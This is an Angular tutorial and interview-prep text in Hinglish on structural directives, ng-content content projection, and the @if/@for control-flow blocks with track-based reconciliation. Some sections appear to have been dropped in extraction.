Nahi, architectural hai. *ngIf ek directive hai: har use pe ek instance banta hai (LView slot), uske liye ek ElementInjector entry (kyunki wo TemplateRef/ViewContainerRef inject karta hai, Ch3 S9), ek input-setter chain chalti hai, aur CommonModule/NgIf import chahiye. @if ek compiler feature hai: δδtemplate() creation mein anchor + template function, aur update mein ek δδconditional(branchIndex) instruction. Koi directive class, koi injector, koi import nahi. Faayde: (1) chhota bundle (locality, Ch3 S1); (2) tez — ek instruction vs directive lifecycle; (3) @else if chain natively (purane mein else ke liye TemplateRef ka jugaad); (4) type narrowing compiler ko directly pata hai (@if (u(); as x)), jabki NgIf ko ngTemplateGuard_ngIf/ngTemplateContextGuard static properties se ye batana padta tha. Same story @for vs *ngFor: *ngFor IterableDiffer abstraction se guzarta tha, @for ka apna optimized reconciliation algorithm hai (S10). Yani Angular ne ek library-level abstraction ko compiler-level primitive bana diya — aur wahi Ivy ki poori philosophy hai (Ch3 S6).

SCENARIO Ek *appHasPermission="'orders.delete'" structural directive banani hai jo permission na hone pe element hataye. Design + security + performance considerations?

(1) Implementation: TemplateRef + ViewContainerRef inject karo; permission ko input.required se lo; effect() mein permission signal padho aur view create/clear karo. Important: har effect run pe blindly clear() + createEmbeddedView() mat karo — pehle check karo ki state badla hai kya (vcr.length), warna har unrelated CD pe view destroy+create hogi (state loss, DOM churn, focus loss). (2) Type narrowing + context: agar template ko permission-related data chahiye toh ngTemplateContextGuard (S7). (3) SECURITY — sabse important: ye sirf UI hai. Element DOM se hataana authorization nahi hai — attacker network tab se API call kar sakta hai. Server pe har mutation par authorization enforce karo. Aur client-side permission list bhi API se aani chahiye, hardcoded nahi. Interviewer yahi sunna chahta hai; jo candidate sirf directive ka code likhta hai wo aadha jawab deta hai. (4) Fallback content: aksar "permission nahi" pe kuch dikhana hota hai (disabled button + tooltip "no access"). Structural directive binary hai (dikhao/hatao) — isliye ek else template support do (*appHasPermission="perm; else noAccess" microsyntax) ya better: @if (can('orders.delete')) + @else use karo, jahan can() ek computed hai. Modern Angular mein custom structural directives ki zaroorat kaafi kam ho gayi hai — @if + ek signal-returning service method zyada readable hai, aur zero directive overhead. Ye judgment dikhana important hai. (5) Performance: agar 1000 elements pe ye directive lagi hai toh 1000 instances + injectors. @if se ye cost nahi. (6) Testing: permission service mock karke dono branches. (7) Recommendation: directive tab likho jab reuse + declarative syntax ka value ho aur usage count chhota ho; warna @if.

ng-content & Content Projection

Covers: projectionDef internals · Multi-slot select · ngProjectAs · Fallback content · Eager creation · Context & styling · contentChildren

1. What is it?

Content projection = parent apne child ke tags ke beech jo likhta hai, wo child ke template mein <ng-content> ki jagah "project" ho jaata hai. Web ki duniya mein ise "slots" kehte hain (Web Components ka <slot>).

<!-- Parent likhta hai -->
<app-card>
  <h2>Order #123</h2>      <!-- ye "content" hai -->
</app-card>

<!-- card.component.html -->
<div class="card">
  <ng-content />             <!-- content yahan aa jaayega -->
</div>

2. Why do we need it?

Kyunki "container" components (Card, Modal, Tabs, Panel) ko apne content ka type nahi pata hona chahiye. Bina projection ke tumhe har content variation ke liye ek input dena padta ([title], [body], [footer]...) — aur wo sirf strings ho sakte the, arbitrary markup nahi. Projection se container sirf layout aur behavior deta hai, content consumer ka rehta hai.

3. What problem does it solve?

  • Rigid components → arbitrary markup andar daalo.
  • String-only inputs → poora template pass karo.
  • Wrapper hell → ek Card component, sau alag contents.
  • Coordination → container projected children ko contentChildren se dhundh ke coordinate kare (Tabs, Accordion).

4. Internal Working

  • L1: ngProjectAs slot-matching ke waqt element ka "fake selector" deta hai. Ye zaroori isliye hai kyunki ng-container ka koi tag/attribute nahi hota jise match kiya ja sake, aur @if/@for ko projected content mein wrap karne ke liye ng-container hi chahiye.
  • L2: Ek component ko doosre selector ki tarah project karwana — powerful, par confusing. Sirf tab jab library ka API force kare.
  • L3: DOM se "content diya gaya ya nahi" check karna — fragile. afterNextRender ke baad hi chalega (SSR pe kaam nahi), content dynamically badle toh stale ho jaayega, aur whitespace nodes se false positives.
  • L4: Sahi rasta: consumer se ek marker directive/component maango (<h2 cardTitle> mein cardTitle ek directive ho), phir contentChildren(CardTitleDirective) se signal-based, reactive detection (Ch4 S7). 11. Common Mistakes

Galtiyan
  • <ng-content> ko @if ke andar rakh ke lazy samajhna — content pehle hi ban chuka hai (parent ke LView mein); uske components ke constructors chal chuke hain. Ye #1 misconception hai.
  • Do default <ng-content /> — doosra khaali rahega. Content duplicate nahi hota.
  • Child ki CSS se projected content style karne ki koshish — projected content pe parent ka _ngcontent hai (Ch4 S4). ::ng-deep se pehle sochlo.
  • <app-card>{{ title }}</app-card> mein title ko card ka samajhna — wo parent ka hai.
  • Projected content ke liye viewChild use karna — contentChild chahiye (Ch4 S7).
  • Per-item context project karne ki koshish (list rows) — impossible; ng-template use karo (S8).
  • DOM inspection se content ka existence check karna — contentChildren ya fallback content use karo.

12. Best Practices

Production rules
  • Static slots = ng-content. Per-item/repeated = ng-template + outlet.
  • Slot selectors attribute-based (select="[cardTitle]") — consumer ke markup pe kam constraint.
  • Fallback content (v18+) use karo — "content diya ya nahi" ka detection hi nahi chahiye.
  • Content presence detection = contentChildren() (reactive), DOM query nahi.
  • Container ki CSS projected content ko chhoone ki koshish na kare — layout wrapper style karo, content nahi.
  • Marker directives ([cardTitle]) ko asli directive banao — tab contentChild se instance bhi milega aur type safety bhi.

13. Performance

Projection ka direct cost chhota hai: projectionDef creation mein ek baar, aur projection DOM nodes ko appendChild karta hai. Koi extra LView nahi banti (content parent ki view ka hissa hai).

Chhupa hua cost: content hamesha banta hai. Agar consumer ne <app-modal> ke andar ek bhaari chart daala hai aur modal band hai, toh chart ka component instantiate ho chuka hai (constructor, ngOnInit, shayad HTTP call!) — bhale hi DOM mein na dikhe. Ye ek asli production bug pattern hai.

Fix: modal jaisi cheezon ke liye ng-template lo (consumer <ng-template> de, modal open pe render kare), ya @defer (Ch3 S7). Aur bade lists mein projection nahi, templates.

14. Edge Cases

  • Fallback content (<ng-content>default</ng-content>) v18+ mein aaya; usse pehle empty check karna padta tha.
  • Whitespace text nodes bhi project hote hain — preserveWhitespaces: false (default) unhe kaafi had tak hataata hai.
  • Projected content ka DI parent ke ElementInjector se resolve hota hai — container ke viewProviders use nahi dikhte, providers dikhte hain (Ch3 S9 + Ch4 S7).
  • select mein complex selectors chal jaate hain (select="button[primary]"), par simple attribute selectors best practice hain.
  • ShadowDom encapsulation (Ch4 S4) mein projection native <slot> se hota hai, ::slotted() se style karo.
  • Ek node ek hi slot mein ja sakta hai — pehla match jeetta hai (declaration order).
  • contentChildren default mein descendants: true (v17+) — nested projected elements bhi mil jaate hain.

15. Interview Questions

EASY ng-content kya karta hai?

Parent ne child ke tags ke beech jo markup likha hai (content), use child ke template mein <ng-content> ki jagah rakh deta hai. Multi-slot ke liye select="[attr]" selectors. Ye container components (Card, Modal, Panel) ko content-agnostic banata hai.

EASY Do <ng-content /> (bina select) likhne se kya hota hai?

Pehla slot saara content le leta hai, doosra khaali rehta hai. Content duplicate nahi hota — wo actual DOM nodes hain jo move kiye jaate hain, copy nahi. Same content do jagah chahiye toh ng-template + do ngTemplateOutlet (S8).

MEDIUM <app-card>{{ title }}</app-card> mein title kiska hai?

Parent ka. Projected content parent ke context mein evaluate hota hai aur parent ke LView mein banta hai — card sirf DOM nodes ko apni jagah move karta hai. Isi wajah se: (1) content pe parent ka _ngcontent attribute hota hai, toh card ki CSS uspe nahi lagti (Ch4 S4); (2) content ka change detection parent ke CD ka hissa hai; (3) projected content ka DI parent ke injector se resolve hota hai.

MEDIUM ng-content ko @if ke andar rakhne se content lazy ho jaata hai?

Nahi — ye sabse common misconception hai. Content parent ke creation pass mein pehle hi ban chuka hota hai: uske components instantiate ho chuke hain (constructor, ngOnInit, HTTP calls tak chal chuki hoti hain). @if false hone pe wo DOM mein insert nahi hote, bas. Sach mein lazy chahiye toh consumer se ng-template lo aur zaroorat pe render karo (S8), ya @defer (Ch3 S7). Ye modal/tab components mein asli production bug banta hai.

HARD Projected content parent ke LView mein banta hai — iske teen consequences batao.

(1) Context: content ki bindings parent ke update block mein compile hoti hain, toh {{ x }} parent ka x padhta hai. Child use apna data nahi de sakta — yahi ng-content ki fundamental limitation hai aur wahi ng-template ke exist karne ki wajah. (2) Change detection: content ka CD parent ke CD ka hissa hai. Iska ulta result: child OnPush ho aur skip ho jaaye, phir bhi projected content ki bindings update ho jaayengi (agar parent check hua) — kyunki wo child ke update block mein hain hi nahi. Ye counter-intuitive hai aur "OnPush component ke andar content update ho raha hai" wale confusion ka jawab hai. (3) Styling + DI: content pe parent ka _ngcontent attribute hai, toh child ki emulated-encapsulation CSS uspe nahi lagti (Ch4 S4); aur content ke andar ke inject() parent ke ElementInjector chain se resolve hote hain, isliye child ke viewProviders unhe nahi dikhte (sirf providers) — Ch3 S9 ka ye edge case tabs/accordion banate waqt bite karta hai. (4 bonus) Lifecycle: content queries (ngAfterContentInit) view queries se pehle resolve hoti hain, kyunki content parent ke creation ka hissa hai — child ka apna view baad mein banta hai.

SCENARIO Ek <app-modal> banaya hai jo <ng-content> se content leta hai. QA report: "modal band hai par API calls ho rahi hain, aur 10 modals wale page pe load slow hai." Diagnose + redesign.

Diagnosis: projected content parent ke creation pass mein banta hai — modal ke @if (open()) ke bahar. Toh consumer ka <app-order-details /> (jo ngOnInit mein HTTP call karta hai) modal band hone pe bhi instantiate ho chuka hai. 10 modals = 10 heavy components + 10 API calls, page load pe. DOM mein kuch nahi dikhta, isliye debugging confusing hai. Redesign options: (1) ng-template based API (best): modal content ko <ng-template> mein maango — <app-modal><ng-template modalBody><app-order-details /></ng-template></app-modal>. Modal contentChild(ModalBodyDirective) se TemplateRef le, aur open() true hone pe ngTemplateOutlet se render kare. Ab content tabhi banta hai jab modal khulta hai, aur band hone pe destroy (state cleanup free). (2) CDK Dialog / imperative: modal ko service se kholo (dialog.open(OrderDetailsComponent)) — component tabhi banta hai, aur ViewContainerRef.createComponent se inputs bhi pass hote hain. Ye industry standard hai. (3) @defer: agar declarative rehna hai, @defer (when open()) se content ka JS chunk bhi lazy ho jaayega (Ch3 S7) — double win: na component bane, na code download ho. S-10

New Control Flow

Covers: @if / @else if / @else · @for + track + @empty · @switch · @let · @defer · Reconciliation algorithm · Migration

1. What is it?

Angular v17 se templates mein built-in control flow blocks hain: @if, @for, @switch, aur (v18+) @let, plus @defer (Ch3 S7). Ye *ngIf/*ngFor/*ngSwitch ko replace karte hain — par ye sirf syntax badalna nahi hai. Ye ek library-level abstraction (directives) ko compiler-level primitives mein badalna hai (S8 mein ye dekha).

2. Why do we need it?

Purane structural directives ke chaar structural problems the: (1) har use pe ek directive instance + injector; (2) CommonModule import zaroori (locality ke against, Ch3 S1); (3) *ngFor ka IterableDiffer ek generic abstraction thi, optimized nahi; (4) syntax hi confusing thi — *ngIf; else ke liye ng-template ka jugaad, aur *ngSwitch ka non-obvious behavior. Blocks ne chaaron solve kiye, aur ek naya feature bhi diya jo directives se possible hi nahi tha: @defer.

3. What problem does it solve?

  • Runtime overhead → koi directive instance, koi injector, koi differ.
  • Bundle → built-in, koi import.
  • Type narrowing → compiler ko directly pata (@if (u(); as x)).
  • Correctness → track mandatory (Ch3 S6 ka identity bug compile error ban gaya).
  • Missing features → @empty, @else if, @defer.

4. Internal Working — compiled instructions

// @if
@if (a()) { A } @else if (b()) { B } @else { C }

// Creation: teen templates (anchors)
//   δδtemplate(0, A_Template, ...)
//   δδtemplate(1, B_Template, ...)
//   δδtemplate(2, C_Template, ...)
// Update: EK instruction
//   δδconditional(a() ? 0 : b() ? 1 : 2);
//
// δδconditional(idx) ke andar:
//   - pichla active index yaad hai?  same? --> kuch mat karo
//   - alag? --> purani embedded view DESTROY, nayi CREATE

// @for
@for (item of items(); track item.id) { ... } @empty { ... }

// Update:
//   δδrepeaterCreate(...)  // creation
//   δδrepeater(items())    // update — YAHAN reconciliation hota hai
  δδrepeater KA ALGORITHM (@for ka dil):

  purani list ke LViews:  [A, B, C, D]   (track keys se indexed)
  nayi collection:        [C, A, E]

  1. Dono ko simultaneously traverse karo (do pointers)
  2. Same key match? --> KEEP (LView reuse, sirf bindings update)
  3. Naya key jo purane set mein hai? --> MOVE (DOM node reposition, LView reuse)
  4. Naya key kahin nahi? --> CREATE (nayi embedded view)
  5. Purana key naye set mein nahi? --> DESTROY

  Result: C(move) A(move) E(create), B & D destroy
          --> 2 DOM moves + 1 create + 2 destroy
          Bina track ke: 4 destroy + 3 create (aur component state gayab!)

  ► *ngFor: IterableDiffer se guzarta tha — ek generic diffing abstraction
    jo har item ke liye ek "record" object banati thi. @for ka algorithm
    directly LView-aware hai, koi intermediate objects nahi.

10. Code Explanation — Line by Line

  • L1: Best case — server ka stable id. Reorder, filter, insert, delete — sab pe identity preserve.
  • L2: Client-side items (naya row form mein) — bina server id ke. crypto.randomUUID() creation ke waqt assign karo, render ke waqt nahi (warna har render pe naya).
  • L3: Primitive list mein value hi identity hai — par duplicates pe Angular error dega ("duplicate keys"). ['a','b','a'] → runtime error. Aise cases mein track $index ya index+value ka combo.
  • L4: $index theek hai sirf jab list kabhi reorder/insert/delete na ho (static config, tabs). Ye judgment call hai — aur agar galat nikla toh Ch3 S6 wala state-corruption bug.
  • L5: Object reference se track — kaam karta hai agar references stable hain (immutable updates jahan sirf badle hue items ke naye references bante hain, Ch1 S4). Agar poora array har baar naya map() se banta hai (L6), toh har item ka reference naya = sab destroy+create.
  • L6: Ye sabse common real bug hai: computed() mein map() se derived objects. Har evaluation naye objects deti hai. track o.id use karo — identity data se aati hai, reference se nahi. (Aur agar fmt(o) mehenga hai, use o ke andar hi precompute karo ya pipe use karo.)

11. Common Mistakes

Galtiyan
  • track $index reorder-able list pe — component state galat row pe (Ch3 S6). Ye correctness bug hai.
  • track mein derived/unstable value (track o.name + o.date) — naam badla toh item "naya" ban gaya, state gayi.
  • Primitive list mein duplicates + track item → runtime error.
  • @if/@for ko "hide/show" samajhna — views destroy/create hoti hain (S8).
  • @switch mein == expect karna — wo === use karta hai (@case (1) vs '1').
  • @let ko computed() samajhna — har CD cycle mein re-evaluate (S7).
  • Bade lists mein @for + koi virtualization nahi — 10,000 embedded views.
  • @defer bina @placeholder — layout shift; bina @error — stale chunk 404 pe dead UI (Ch3 S7).

12. Best Practices

Production rules
  • Naye code mein sirf blocks. Purane codebases: ng generate @angular/core:control-flow se automated migration.
  • track: stable business id. $index sirf provably static lists pe (aur comment likho kyun).
  • @if (x(); as y) se signal ko ek baar read karo; @let se repeated sub-expressions.
  • Discriminated unions + @switch = exhaustive UI states (Ch2 S2).
  • @empty hamesha — empty state UX ka default hissa.
  • Bhaari children @defer mein, placeholder/error ke saath.
  • 1000+ items = virtualization (cdk-virtual-scroll), @for nahi.

13. Performance

Blocks vs directives: @if mein koi directive instance/injector nahi (S8) — 1000 uses pe 1000 objects bache. @for ka reconciliation IterableDiffer ke intermediate record objects ke bina chalta hai, aur LView-aware hai (move operations directly).

Asli lever track hai. Sahi track = keep/move (DOM nodes reposition, LView reuse). Galat track = destroy+create (naye DOM nodes, naye LViews, naye component instances, GC pressure — Ch1 S8). 1000-row list ke reorder mein ye 10x farak ho sakta hai, aur state loss free mein.

Embedded views ki cost: har @for item ek LView + DOM nodes. 10,000 items = 10,000 LViews, chahe track perfect ho. Iska ek hi jawab hai: virtualization (sirf visible ~30 render karo).

14. Edge Cases

  • @for mein track expression mein $index use ho sakta hai (track $index + item.id) — rarely useful.
  • Duplicate track keys → dev mode mein error ("collection contains duplicate keys").
  • @empty tabhi chalta hai jab collection length 0 ho — null/undefined pe @for hi error dega, pehle @if ya ?? [].
  • @switch mein koi break nahi, koi fallthrough nahi — pehla matching case, bas.
  • @if ke as alias sirf us block ke andar visible hai (S7 scope rules).
  • @defer ke andar ke components ki dependencies alag chunk mein jaati hain — agar wahi component eager code se bhi import ho toh chunk split nahi hoga (Ch3 S7).
  • Blocks ng-template mein compile hote hain, toh viewChild se unke andar ke elements undefined ho sakte hain jab tak block active na ho (Ch4 S7).
  • @for ke contextual variables ko alias karna zaroori hai nested loops mein (let i = $index), warna shadowing.

15. Interview Questions

EASY @if/@for/@switch ne *ngIf/*ngFor/*ngSwitch se kya behtar diya?

(1) Built-in — koi CommonModule import (locality, chhota bundle). (2) Koi directive instance/injector per use — tez. (3) @for ka apna optimized reconciliation, IterableDiffer abstraction nahi. (4) Better type narrowing (@if (x(); as y), @switch + discriminated unions). (5) Naye features: @empty, @else if, mandatory track, aur @defer (jo directive se possible hi nahi tha).

EASY @for mein track mandatory kyun hai?

Kyunki uske bina identity ka koi source nahi, aur Angular ko decide karna padta hai kaunsa DOM node/LView kis item ka hai. Galat identity = component instances ki state galat items pe chali jaati hai (form input, focus, animation) — ye correctness bug hai, sirf performance ka nahi (Ch3 S6). Angular ne ise compile error bana ke ek poori bug class khatam kar di.

MEDIUM track $index kab safe hai aur kab nahi?

Safe: list kabhi reorder/insert/delete na ho (static config, fixed tabs) — position hi identity hai. Unsafe: koi bhi list jo sort, filter, paginate, ya splice ho sakti hai. Reorder pe $index se Angular sochta hai "position 0 ka content badal gaya", toh wo existing LView ko naye data se update karta hai — component instance destroy nahi hota, aur uski internal state (half-typed input, scroll, animation) galat item ke saath jud jaati hai. Rule: stable business id use karo; $index ka use ho toh comment likho ki list kyun static hai.

MEDIUM @if compile hoke kya banta hai?

Creation mein har branch ke liye ek δδtemplate() (anchor + template function), aur update mein ek δδconditional(activeIndex) instruction. Ye instruction pichla active branch yaad rakhti hai: same hai toh kuch nahi, alag hai toh purani embedded view destroy karke nayi create. Koi directive class, koi ElementInjector, koi input-setter chain nahi — *ngIf mein ye teeno the.

HARD @for ka reconciliation algorithm explain karo aur *ngFor ke IterableDiffer se compare karo.

δδrepeater(collection) purani list ke LViews (track keys se) aur nayi collection ko simultaneously traverse karta hai. Har position pe: same key → keep (LView reuse, sirf bindings update); key purane set mein kahin aur → move (DOM nodes reposition, LView reuse — component instance aur uski state travel karti hai); key naya → create (nayi embedded view); purana key naye set mein nahi → destroy. Ye directly LView-aware hai — DOM operations minimal hain aur koi intermediate allocation nahi. *ngFor ka IterableDiffer ek generic diffing abstraction thi: har item ke liye ek IterableChangeRecord object banti thi, linked lists maintain hoti thi (added/moved/removed collections), phir NgForOf un records ko padhkar ViewContainerRef pe operations karta tha. Yani ek extra layer of objects + indirection, har CD cycle mein. Plus trackBy optional tha — default reference identity, jo derived arrays (map()) ke saath har baar sab recreate karta tha, chupchaap. Deep point: @for ne diffing ko "library concern" se "compiler+runtime primitive" bana diya (bilkul jaise interpolation ka dirty check compiled code mein baked hai, S1). Ye Ivy ki poori philosophy hai (Ch3 S6): generic runtime abstractions ko specialized compiled code se replace karo.

SCENARIO Ek order list hai: server se paginated data, client-side sort/filter, har row mein inline-edit form, aur infinite scroll. Control flow + track + performance design karo.

(1) track — sabse critical decision: track order.id (server id). $index yahan disaster hoga: sort/filter pe rows reorder honge, aur inline-edit forms ki half-typed values galat orders pe chali jaayengi — ek silent data-corruption bug jo QA aksar miss karta hai. Naye (unsaved) rows ke liye client-generated uuid (creation pe assign, render pe nahi). (2) Derived arrays ka trap: visible = computed(() => orders().filter(...).sort(...)) — ye har baar naya array deta hai, par items ke references wahi hain (agar immutable updates hain, Ch1 S4). track order.id se farak nahi padta. Par agar .map(o => ({...o, label})) kiya toh naye objects — phir bhi track o.id bachata hai. Sabak: identity data se aati hai, reference se nahi. (3) Inline edit ki state: row component ke andar signal (ephemeral, Ch4 S9). Reorder pe LView move hota hai, instance zinda rehta hai, state travel karti hai — track sahi hone pe ye free milta hai. (4) Sort/filter/page = navigable state (Ch4 S9) → URL query params, withComponentInputBinding(). Refresh/share/back button kaam karega. (5) Infinite scroll + @for = 10,000 embedded views. Sirf track se ye theek nahi hota. Do options: (a) virtualization (cdk-virtual-scroll-viewport) — sirf ~30 rows DOM mein; par tab aria-rowcount total dena zaroori (S3). (b) Agar rows bhaari hain toh @defer (on viewport) per-row bhi, par ye 10,000 defer blocks = bura idea. Virtualization hi sahi jawab hai. (6) @empty + loading + error: @switch (state().status) discriminated union se (Ch2 S2) — loading skeleton, error retry, aur success mein @for ... @empty se "koi order nahi mila, filter badlo" wala CTA. (7) Rows dumb rakho: [order] input + (edited) output; koi service inject nahi (Ch4 S9). OnPush/signals se sirf badle hue rows ki CD chalegi. (8) Verify: reorder karke ek half-typed input ki value track karo — sahi row pe rahi? Ye ek test likho, wo poore design ka proof hai.
